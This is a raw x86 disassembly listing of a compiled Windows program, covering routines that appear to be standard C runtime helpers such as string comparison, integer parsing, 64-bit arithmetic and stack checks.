  426ba7:	mov    DWORD PTR [ebp-0x44],esi
  426baa:	jmp    0x426baf
  426bac:	mov    esi,DWORD PTR [ebp-0x44]
  426baf:	cmp    DWORD PTR [ebp-0x2c],edi
  426bb2:	jne    0x426bce
  426bb4:	push   edi
  426bb5:	push   edi
  426bb6:	push   ebx
  426bb7:	push   DWORD PTR [ebp+0x10]
  426bba:	push   0x1
  426bbc:	push   DWORD PTR [ebp+0x8]
  426bbf:	call   DWORD PTR ds:0x4280cc
  426bc5:	mov    esi,eax
  426bc7:	mov    DWORD PTR [ebp-0x44],esi
  426bca:	cmp    esi,edi
  426bcc:	je     0x426c26
  426bce:	mov    DWORD PTR [ebp-0x4],edi
  426bd1:	lea    eax,[esi+esi*1]
  426bd4:	add    eax,0x3
  426bd7:	and    eax,0xfffffffc
  426bda:	call   0x4238b0
  426bdf:	mov    DWORD PTR [ebp-0x18],esp
  426be2:	mov    ebx,esp
  426be4:	mov    DWORD PTR [ebp-0x48],ebx
  426be7:	lea    eax,[esi+esi*1]
  426bea:	push   eax
  426beb:	push   edi
  426bec:	push   ebx
  426bed:	call   0x426160
  426bf2:	add    esp,0xc
  426bf5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426bf9:	jmp    0x426c12
  426bfb:	xor    eax,eax
  426bfd:	inc    eax
  426bfe:	ret    
  426bff:	mov    esp,DWORD PTR [ebp-0x18]
  426c02:	call   0x426cf5
  426c07:	xor    edi,edi
  426c09:	xor    ebx,ebx
  426c0b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c0f:	mov    esi,DWORD PTR [ebp-0x44]
  426c12:	cmp    ebx,edi
  426c14:	jne    0x426c34
  426c16:	push   esi
  426c17:	push   0x2
  426c19:	call   0x424978
  426c1e:	pop    ecx
  426c1f:	pop    ecx
  426c20:	mov    ebx,eax
  426c22:	cmp    ebx,edi
  426c24:	jne    0x426c2d
  426c26:	xor    eax,eax
  426c28:	jmp    0x426ce1
  426c2d:	mov    DWORD PTR [ebp-0x24],0x1
  426c34:	push   esi
  426c35:	push   ebx
  426c36:	push   DWORD PTR [ebp-0x28]
  426c39:	push   DWORD PTR [ebp+0x10]
  426c3c:	push   0x1
  426c3e:	push   DWORD PTR [ebp+0x8]
  426c41:	call   DWORD PTR ds:0x4280cc
  426c47:	test   eax,eax
  426c49:	je     0x426cd2
  426c4f:	cmp    DWORD PTR [ebp+0x18],edi
  426c52:	je     0x426c74
  426c54:	push   edi
  426c55:	push   edi
  426c56:	push   DWORD PTR [ebp+0x1c]
  426c59:	push   DWORD PTR [ebp+0x18]
  426c5c:	push   esi
  426c5d:	push   ebx
  426c5e:	push   edi
  426c5f:	push   DWORD PTR [ebp+0xc]
  426c62:	call   DWORD PTR ds:0x428050
  426c68:	test   eax,eax
  426c6a:	je     0x426cd2
  426c6c:	mov    eax,DWORD PTR [ebp+0x18]
  426c6f:	mov    DWORD PTR [ebp-0x20],eax
  426c72:	jmp    0x426cd2
  426c74:	cmp    DWORD PTR [ebp-0x2c],edi
  426c77:	jne    0x426c8f
  426c79:	push   edi
  426c7a:	push   edi
  426c7b:	push   edi
  426c7c:	push   edi
  426c7d:	push   esi
  426c7e:	push   ebx
  426c7f:	push   edi
  426c80:	push   DWORD PTR [ebp+0xc]
  426c83:	call   DWORD PTR ds:0x428050
  426c89:	mov    esi,eax
  426c8b:	cmp    esi,edi
  426c8d:	je     0x426cd2
  426c8f:	push   esi
  426c90:	push   0x1
  426c92:	call   0x424978
  426c97:	pop    ecx
  426c98:	pop    ecx
  426c99:	mov    DWORD PTR [ebp-0x20],eax
  426c9c:	cmp    eax,edi
  426c9e:	je     0x426cd2
  426ca0:	push   edi
  426ca1:	push   edi
  426ca2:	push   esi
  426ca3:	push   eax
  426ca4:	push   esi
  426ca5:	push   ebx
  426ca6:	push   edi
  426ca7:	push   DWORD PTR [ebp+0xc]
  426caa:	call   DWORD PTR ds:0x428050
  426cb0:	cmp    eax,edi
  426cb2:	jne    0x426cc2
  426cb4:	push   DWORD PTR [ebp-0x20]
  426cb7:	call   0x42446a
  426cbc:	pop    ecx
  426cbd:	mov    DWORD PTR [ebp-0x20],edi
  426cc0:	jmp    0x426cd2
  426cc2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426cc6:	je     0x426cd2
  426cc8:	mov    ecx,DWORD PTR [ebp+0x14]
  426ccb:	mov    DWORD PTR [ecx],eax
  426ccd:	jmp    0x426cd2
  426ccf:	mov    ebx,DWORD PTR [ebp-0x48]
  426cd2:	cmp    DWORD PTR [ebp-0x24],edi
  426cd5:	je     0x426cde
  426cd7:	push   ebx
  426cd8:	call   0x42446a
  426cdd:	pop    ecx
  426cde:	mov    eax,DWORD PTR [ebp-0x20]
  426ce1:	lea    esp,[ebp-0x54]
  426ce4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426ce7:	xor    ecx,DWORD PTR [ebp+0x4]
  426cea:	call   0x423f2c
  426cef:	call   0x423893
  426cf4:	ret    
  426cf5:	push   ebp
  426cf6:	mov    ebp,esp
  426cf8:	sub    esp,0x48
  426cfb:	push   ebx
  426cfc:	push   esi
  426cfd:	push   edi
  426cfe:	push   0x4
  426d00:	pop    eax
  426d01:	call   0x4238b0
  426d06:	mov    ebx,esp
  426d08:	push   0x1c
  426d0a:	lea    eax,[ebp-0x24]
  426d0d:	push   eax
  426d0e:	push   ebx
  426d0f:	call   DWORD PTR ds:0x4280e8
  426d15:	test   eax,eax
  426d17:	je     0x426d8a
  426d19:	mov    edi,DWORD PTR [ebp-0x20]
  426d1c:	lea    eax,[ebp-0x48]
  426d1f:	push   eax
  426d20:	call   DWORD PTR ds:0x4280e4
  426d26:	mov    eax,DWORD PTR [ebp-0x44]
  426d29:	lea    esi,[eax-0x1]
  426d2c:	not    esi
  426d2e:	and    esi,ebx
  426d30:	sub    esi,eax
  426d32:	mov    DWORD PTR [ebp-0x4],eax
  426d35:	mov    eax,ds:0x45cac4
  426d3a:	mov    ecx,eax
  426d3c:	dec    ecx
  426d3d:	neg    ecx
  426d3f:	sbb    ecx,ecx
  426d41:	and    ecx,0xffff1000
  426d47:	add    ecx,0x11000
  426d4d:	add    ecx,edi
  426d4f:	cmp    esi,ecx
  426d51:	jb     0x426d8a
  426d53:	cmp    eax,0x1
  426d56:	je     0x426da2
  426d58:	mov    ebx,edi
  426d5a:	mov    edi,0x1000
  426d5f:	push   0x1c
  426d61:	lea    eax,[ebp-0x24]
  426d64:	push   eax
  426d65:	push   ebx
  426d66:	call   DWORD PTR ds:0x4280e8
  426d6c:	test   eax,eax
  426d6e:	je     0x426d8a
  426d70:	add    ebx,DWORD PTR [ebp-0x18]
  426d73:	test   DWORD PTR [ebp-0x14],edi
  426d76:	je     0x426d5f
  426d78:	test   BYTE PTR [ebp-0xf],0x1
  426d7c:	mov    ebx,DWORD PTR [ebp-0x24]
  426d7f:	je     0x426d86
  426d81:	xor    eax,eax
  426d83:	inc    eax
  426d84:	jmp    0x426dbe
  426d86:	cmp    esi,ebx
  426d88:	jae    0x426d8e
  426d8a:	xor    eax,eax
  426d8c:	jmp    0x426dbe
  426d8e:	push   0x4
  426d90:	push   edi
  426d91:	push   DWORD PTR [ebp-0x4]
  426d94:	push   ebx
  426d95:	call   DWORD PTR ds:0x4280ac
  426d9b:	mov    eax,ds:0x45cac4
  426da0:	jmp    0x426da4
  426da2:	mov    ebx,esi
  426da4:	dec    eax
  426da5:	neg    eax
  426da7:	sbb    eax,eax
  426da9:	and    eax,0x103
  426dae:	lea    ecx,[ebp-0x8]
  426db1:	push   ecx
  426db2:	inc    eax
  426db3:	push   eax
  426db4:	push   DWORD PTR [ebp-0x4]
  426db7:	push   ebx
  426db8:	call   DWORD PTR ds:0x428008
  426dbe:	lea    esp,[ebp-0x54]
  426dc1:	pop    edi
  426dc2:	pop    esi
  426dc3:	pop    ebx
  426dc4:	leave  
  426dc5:	ret    
  426dc6:	int3   
  426dc7:	int3   
  426dc8:	int3   
  426dc9:	int3   
  426dca:	int3   
  426dcb:	int3   
  426dcc:	int3   
  426dcd:	int3   
  426dce:	int3   
  426dcf:	int3   
  426dd0:	push   ebp
  426dd1:	mov    ebp,esp
  426dd3:	push   edi
  426dd4:	push   esi
  426dd5:	push   ebx
  426dd6:	mov    esi,DWORD PTR [ebp+0xc]
  426dd9:	mov    edi,DWORD PTR [ebp+0x8]
  426ddc:	mov    al,0xff
  426dde:	mov    edi,edi
  426de0:	or     al,al
  426de2:	je     0x426e16
  426de4:	mov    al,BYTE PTR [esi]
  426de6:	add    esi,0x1
  426de9:	mov    ah,BYTE PTR [edi]
  426deb:	add    edi,0x1
  426dee:	cmp    ah,al
  426df0:	je     0x426de0
  426df2:	sub    al,0x41
  426df4:	cmp    al,0x1a
  426df6:	sbb    cl,cl
  426df8:	and    cl,0x20
  426dfb:	add    al,cl
  426dfd:	add    al,0x41
  426dff:	xchg   al,ah
  426e01:	sub    al,0x41
  426e03:	cmp    al,0x1a
  426e05:	sbb    cl,cl
  426e07:	and    cl,0x20
  426e0a:	add    al,cl
  426e0c:	add    al,0x41
  426e0e:	cmp    al,ah
  426e10:	je     0x426de0
  426e12:	sbb    al,al
  426e14:	sbb    al,0xff
  426e16:	movsx  eax,al
  426e19:	pop    ebx
  426e1a:	pop    esi
  426e1b:	pop    edi
  426e1c:	leave  
  426e1d:	ret    
  426e1e:	push   esi
  426e1f:	push   edi
  426e20:	call   0x42370d
  426e25:	mov    edi,DWORD PTR [eax+0x64]
  426e28:	cmp    edi,DWORD PTR ds:0x45c58c
  426e2e:	je     0x426e37
  426e30:	call   0x424bbf
  426e35:	mov    edi,eax
  426e37:	mov    esi,DWORD PTR [esp+0xc]
  426e3b:	cmp    DWORD PTR [edi+0x28],0x1
  426e3f:	movzx  eax,BYTE PTR [esi]
  426e42:	jle    0x426e52
  426e44:	push   0x8
  426e46:	push   eax
  426e47:	push   edi
  426e48:	call   0x426ea6
  426e4d:	add    esp,0xc
  426e50:	jmp    0x426e5c
  426e52:	mov    ecx,DWORD PTR [edi+0x48]
  426e55:	movzx  eax,BYTE PTR [ecx+eax*2]
  426e59:	and    eax,0x8
  426e5c:	test   eax,eax
  426e5e:	je     0x426e63
  426e60:	inc    esi
  426e61:	jmp    0x426e3b
  426e63:	movzx  ecx,BYTE PTR [esi]
  426e66:	inc    esi
  426e67:	cmp    ecx,0x2d
  426e6a:	mov    edx,ecx
  426e6c:	je     0x426e73
  426e6e:	cmp    ecx,0x2b
  426e71:	jne    0x426e77
  426e73:	movzx  ecx,BYTE PTR [esi]
  426e76:	inc    esi
  426e77:	xor    eax,eax
  426e79:	cmp    ecx,0x30
  426e7c:	jl     0x426e88
  426e7e:	cmp    ecx,0x39
  426e81:	jg     0x426e88
  426e83:	sub    ecx,0x30
  426e86:	jmp    0x426e8b
  426e88:	or     ecx,0xffffffff
  426e8b:	cmp    ecx,0xffffffff
  426e8e:	je     0x426e9c
  426e90:	lea    eax,[eax+eax*4]
  426e93:	lea    eax,[ecx+eax*2]
  426e96:	movzx  ecx,BYTE PTR [esi]
  426e99:	inc    esi
  426e9a:	jmp    0x426e79
  426e9c:	cmp    edx,0x2d
  426e9f:	pop    edi
  426ea0:	pop    esi
  426ea1:	jne    0x426ea5
  426ea3:	neg    eax
  426ea5:	ret    
  426ea6:	push   ebp
  426ea7:	mov    ebp,esp
  426ea9:	push   ecx
  426eaa:	mov    eax,DWORD PTR [ebp+0xc]
  426ead:	lea    ecx,[eax+0x1]
  426eb0:	cmp    ecx,0x100
  426eb6:	mov    ecx,DWORD PTR [ebp+0x8]
  426eb9:	ja     0x426ec4
  426ebb:	mov    ecx,DWORD PTR [ecx+0x48]
  426ebe:	movzx  eax,WORD PTR [ecx+eax*2]
  426ec2:	jmp    0x426f18
  426ec4:	push   esi
  426ec5:	mov    edx,eax
  426ec7:	sar    edx,0x8
  426eca:	push   edi
  426ecb:	mov    edi,DWORD PTR [ecx+0x48]
  426ece:	movzx  esi,dl
  426ed1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426ed6:	pop    edi
  426ed7:	pop    esi
  426ed8:	je     0x426ee9
  426eda:	and    BYTE PTR [ebp-0x2],0x0
  426ede:	push   0x2
  426ee0:	mov    BYTE PTR [ebp-0x3],al
  426ee3:	mov    BYTE PTR [ebp-0x4],dl
  426ee6:	pop    eax
  426ee7:	jmp    0x426ef3
  426ee9:	and    BYTE PTR [ebp-0x3],0x0
  426eed:	mov    BYTE PTR [ebp-0x4],al
  426ef0:	xor    eax,eax
  426ef2:	inc    eax
  426ef3:	push   0x1
  426ef5:	push   DWORD PTR [ecx+0x14]
  426ef8:	push   DWORD PTR [ecx+0x4]
  426efb:	lea    ecx,[ebp+0xe]
  426efe:	push   ecx
  426eff:	push   eax
  426f00:	lea    eax,[ebp-0x4]
  426f03:	push   eax
  426f04:	push   0x1
  426f06:	call   0x425f88
  426f0b:	add    esp,0x1c
  426f0e:	test   eax,eax
  426f10:	jne    0x426f14
  426f12:	leave  
  426f13:	ret    
  426f14:	movzx  eax,WORD PTR [ebp+0xe]
  426f18:	and    eax,DWORD PTR [ebp+0x10]
  426f1b:	leave  
  426f1c:	ret    
  426f1d:	int3   
  426f1e:	int3   
  426f1f:	int3   
  426f20:	mov    eax,DWORD PTR [esp+0x8]
  426f24:	mov    ecx,DWORD PTR [esp+0x10]
  426f28:	or     ecx,eax
  426f2a:	mov    ecx,DWORD PTR [esp+0xc]
  426f2e:	jne    0x426f39
  426f30:	mov    eax,DWORD PTR [esp+0x4]
  426f34:	mul    ecx
  426f36:	ret    0x10
  426f39:	push   ebx
  426f3a:	mul    ecx
  426f3c:	mov    ebx,eax
  426f3e:	mov    eax,DWORD PTR [esp+0x8]
  426f42:	mul    DWORD PTR [esp+0x14]
  426f46:	add    ebx,eax
  426f48:	mov    eax,DWORD PTR [esp+0x8]
  426f4c:	mul    ecx
  426f4e:	add    edx,ebx
  426f50:	pop    ebx
  426f51:	ret    0x10
  426f54:	int3   
  426f55:	int3   
  426f56:	int3   
  426f57:	int3   
  426f58:	int3   
  426f59:	int3   
  426f5a:	int3   
  426f5b:	int3   
  426f5c:	int3   
  426f5d:	int3   
  426f5e:	int3   
  426f5f:	int3   
  426f60:	push   ebp
  426f61:	mov    ebp,esp
  426f63:	push   edi
  426f64:	push   esi
  426f65:	push   ebx
  426f66:	mov    ecx,DWORD PTR [ebp+0x10]
  426f69:	or     ecx,ecx
  426f6b:	je     0x426fba
  426f6d:	mov    esi,DWORD PTR [ebp+0x8]
  426f70:	mov    edi,DWORD PTR [ebp+0xc]
  426f73:	mov    bh,0x41
  426f75:	mov    bl,0x5a
  426f77:	mov    dh,0x20
  426f79:	lea    ecx,[ecx+0x0]
  426f7c:	mov    ah,BYTE PTR [esi]
  426f7e:	or     ah,ah
  426f80:	mov    al,BYTE PTR [edi]
  426f82:	je     0x426fab
  426f84:	or     al,al
  426f86:	je     0x426fab
  426f88:	add    esi,0x1
  426f8b:	add    edi,0x1
  426f8e:	cmp    ah,bh
  426f90:	jb     0x426f98
  426f92:	cmp    ah,bl
  426f94:	ja     0x426f98
  426f96:	add    ah,dh
  426f98:	cmp    al,bh
  426f9a:	jb     0x426fa2
  426f9c:	cmp    al,bl
  426f9e:	ja     0x426fa2
  426fa0:	add    al,dh
  426fa2:	cmp    ah,al
  426fa4:	jne    0x426fb1
  426fa6:	sub    ecx,0x1
  426fa9:	jne    0x426f7c
  426fab:	xor    ecx,ecx
  426fad:	cmp    ah,al
  426faf:	je     0x426fba
  426fb1:	mov    ecx,0xffffffff
  426fb6:	jb     0x426fba
  426fb8:	neg    ecx
  426fba:	mov    eax,ecx
  426fbc:	pop    ebx
  426fbd:	pop    esi
  426fbe:	pop    edi
  426fbf:	leave  
  426fc0:	ret    
  426fc1:	int3   
  426fc2:	int3   
  426fc3:	int3   
  426fc4:	int3   
  426fc5:	int3   
  426fc6:	int3   
  426fc7:	int3   
  426fc8:	int3   
  426fc9:	int3   
  426fca:	int3   
  426fcb:	int3   
  426fcc:	int3   
  426fcd:	int3   
  426fce:	int3   
  426fcf:	int3   
  426fd0:	push   esi
  426fd1:	mov    eax,DWORD PTR [esp+0x14]
  426fd5:	or     eax,eax
  426fd7:	jne    0x427001
  426fd9:	mov    ecx,DWORD PTR [esp+0x10]
  426fdd:	mov    eax,DWORD PTR [esp+0xc]
  426fe1:	xor    edx,edx
  426fe3:	div    ecx
  426fe5:	mov    ebx,eax
  426fe7:	mov    eax,DWORD PTR [esp+0x8]
  426feb:	div    ecx
  426fed:	mov    esi,eax
  426fef:	mov    eax,ebx
  426ff1:	mul    DWORD PTR [esp+0x10]
  426ff5:	mov    ecx,eax
  426ff7:	mov    eax,esi
  426ff9:	mul    DWORD PTR [esp+0x10]
  426ffd:	add    edx,ecx
  426fff:	jmp    0x427048
  427001:	mov    ecx,eax
  427003:	mov    ebx,DWORD PTR [esp+0x10]
  427007:	mov    edx,DWORD PTR [esp+0xc]
  42700b:	mov    eax,DWORD PTR [esp+0x8]
  42700f:	shr    ecx,1
  427011:	rcr    ebx,1
  427013:	shr    edx,1
  427015:	rcr    eax,1
  427017:	or     ecx,ecx
  427019:	jne    0x42700f
  42701b:	div    ebx
  42701d:	mov    esi,eax
  42701f:	mul    DWORD PTR [esp+0x14]
  427023:	mov    ecx,eax
  427025:	mov    eax,DWORD PTR [esp+0x10]
  427029:	mul    esi
  42702b:	add    edx,ecx
  42702d:	jb     0x42703d
  42702f:	cmp    edx,DWORD PTR [esp+0xc]
  427033:	ja     0x42703d
  427035:	jb     0x427046
  427037:	cmp    eax,DWORD PTR [esp+0x8]
  42703b:	jbe    0x427046
  42703d:	dec    esi
  42703e:	sub    eax,DWORD PTR [esp+0x10]
  427042:	sbb    edx,DWORD PTR [esp+0x14]
  427046:	xor    ebx,ebx
  427048:	sub    eax,DWORD PTR [esp+0x8]
  42704c:	sbb    edx,DWORD PTR [esp+0xc]
  427050:	neg    edx
  427052:	neg    eax
  427054:	sbb    edx,0x0
  427057:	mov    ecx,edx
  427059:	mov    edx,ebx
  42705b:	mov    ebx,ecx
  42705d:	mov    ecx,eax
  42705f:	mov    eax,esi
  427061:	pop    esi
  427062:	ret    0x10
  427065:	int3   
  427066:	int3   
  427067:	int3   
  427068:	int3   
  427069:	int3   
  42706a:	int3   
  42706b:	int3   
  42706c:	int3   
  42706d:	int3   
  42706e:	int3   
  42706f:	int3   
  427070:	lea    eax,[edx-0x1]
  427073:	pop    ebx
  427074:	ret    
  427075:	lea    esp,[esp+0x0]
  42707c:	lea    esp,[esp+0x0]
  427080:	xor    eax,eax
  427082:	mov    al,BYTE PTR [esp+0x8]
  427086:	push   ebx
  427087:	mov    ebx,eax
  427089:	shl    eax,0x8
  42708c:	mov    edx,DWORD PTR [esp+0x8]
  427090:	test   edx,0x3
  427096:	je     0x4270ad
  427098:	mov    cl,BYTE PTR [edx]
  42709a:	add    edx,0x1
  42709d:	cmp    cl,bl
  42709f:	je     0x427070
  4270a1:	test   cl,cl
  4270a3:	je     0x4270f6
  4270a5:	test   edx,0x3
  4270ab:	jne    0x427098
  4270ad:	or     ebx,eax
  4270af:	push   edi
  4270b0:	mov    eax,ebx
  4270b2:	shl    ebx,0x10
  4270b5:	push   esi
  4270b6:	or     ebx,eax
  4270b8:	mov    ecx,DWORD PTR [edx]
  4270ba:	mov    edi,0x7efefeff
  4270bf:	mov    eax,ecx
  4270c1:	mov    esi,edi
  4270c3:	xor    ecx,ebx
  4270c5:	add    esi,eax
  4270c7:	add    edi,ecx
  4270c9:	xor    ecx,0xffffffff
  4270cc:	xor    eax,0xffffffff
  4270cf:	xor    ecx,edi
  4270d1:	xor    eax,esi
  4270d3:	add    edx,0x4
  4270d6:	and    ecx,0x81010100
  4270dc:	jne    0x4270fa
  4270de:	and    eax,0x81010100
  4270e3:	je     0x4270b8
  4270e5:	and    eax,0x1010100
  4270ea:	jne    0x4270f4
  4270ec:	and    esi,0x80000000
  4270f2:	jne    0x4270b8
  4270f4:	pop    esi
  4270f5:	pop    edi
  4270f6:	pop    ebx
  4270f7:	xor    eax,eax
  4270f9:	ret    
  4270fa:	mov    eax,DWORD PTR [edx-0x4]
  4270fd:	cmp    al,bl
  4270ff:	je     0x427137
  427101:	test   al,al
  427103:	je     0x4270f4
  427105:	cmp    ah,bl
  427107:	je     0x427130
  427109:	test   ah,ah
  42710b:	je     0x4270f4
  42710d:	shr    eax,0x10
  427110:	cmp    al,bl
  427112:	je     0x427129
  427114:	test   al,al
  427116:	je     0x4270f4
  427118:	cmp    ah,bl
  42711a:	je     0x427122
  42711c:	test   ah,ah
  42711e:	je     0x4270f4
  427120:	jmp    0x4270b8
  427122:	pop    esi
  427123:	pop    edi
  427124:	lea    eax,[edx-0x1]
  427127:	pop    ebx
  427128:	ret    
  427129:	lea    eax,[edx-0x2]
  42712c:	pop    esi
  42712d:	pop    edi
  42712e:	pop    ebx
  42712f:	ret    
  427130:	lea    eax,[edx-0x3]
  427133:	pop    esi
  427134:	pop    edi
  427135:	pop    ebx
  427136:	ret    
  427137:	lea    eax,[edx-0x4]
  42713a:	pop    esi
  42713b:	pop    edi
  42713c:	pop    ebx
  42713d:	ret    
  42713e:	jmp    DWORD PTR ds:0x4280e0
